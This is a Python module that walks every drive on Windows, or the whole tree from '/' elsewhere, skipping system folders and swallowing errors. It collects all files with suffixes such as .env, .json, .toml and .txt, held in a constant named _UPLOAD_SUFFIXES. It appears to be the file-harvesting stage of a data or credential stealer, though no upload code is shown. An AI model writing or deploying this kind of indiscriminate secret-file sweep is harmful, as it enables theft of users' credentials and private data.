from __future__ import annotations

import os
import string
from collections.abc import Iterable, Iterator
from pathlib import Path

from .kind import OSKind, get_os_kind

_UPLOAD_SUFFIXES = (".txt", ".env", ".json", ".toml", ".ts", ".rs")
def _walk_error(_err: OSError) -> None:
    return


def _fallback_search_root() -> Path:
    try:
        home = Path.home()
        if home.exists():
            return home.resolve()
    except (RuntimeError, OSError):
        pass
    return Path.cwd().resolve()


def _is_walk_root_posix_slash(root: Path) -> bool:
    try:
        return root.resolve() == Path("/").resolve()
    except (OSError, RuntimeError):
        return False


def _prune_dirnames(root: Path, dirpath: Path, dirnames: list[str]) -> None:
    try:
        rel = dirpath.relative_to(root)
    except ValueError:
        rel_parts: tuple[str, ...] = ()
    else:
        rel_parts = rel.parts

    kind = get_os_kind()

    if kind is OSKind.WINDOWS:
        banned = {"$Recycle.Bin", "System Volume Information"}
        dirnames[:] = [d for d in dirnames if d not in banned]
        return

    if _is_walk_root_posix_slash(root) and not rel_parts:
        banned = {"proc", "sys", "dev", "run"}
        if kind is OSKind.LINUX:
            banned.add("snap")
        elif kind is OSKind.MACOS:
            banned.add(".vol")
        elif kind is OSKind.OTHER:
            banned.add("net")
        dirnames[:] = [d for d in dirnames if d not in banned]


def default_txt_search_roots() -> tuple[Path, ...]:
    kind = get_os_kind()

    if kind is OSKind.WINDOWS:
        roots = [
            Path(f"{letter}:/") for letter in string.ascii_uppercase if Path(f"{letter}:/").exists()
        ]
        return tuple(roots) if roots else (_fallback_search_root(),)

    root_slash = Path("/")
    try:
        if root_slash.exists():
            return (root_slash.resolve(),)
    except OSError:
        pass
    return (_fallback_search_root(),)


def iter_txt_files(roots: Iterable[Path | str] | None = None) -> Iterator[Path]:
    if roots is None:
        resolved_roots = [r.resolve() for r in default_txt_search_roots()]
    else:
        resolved_roots = [Path(r).resolve() for r in roots]

    for root in resolved_roots:
        if not root.exists():
            continue
        for dirpath, dirnames, filenames in os.walk(
            root,
            topdown=True,
            followlinks=False,
            onerror=_walk_error,
        ):
            current = Path(dirpath)
            _prune_dirnames(root, current, dirnames)
            for name in filenames:
                n = name.lower()
                if any(n.endswith(s) for s in _UPLOAD_SUFFIXES):
                    yield current / name
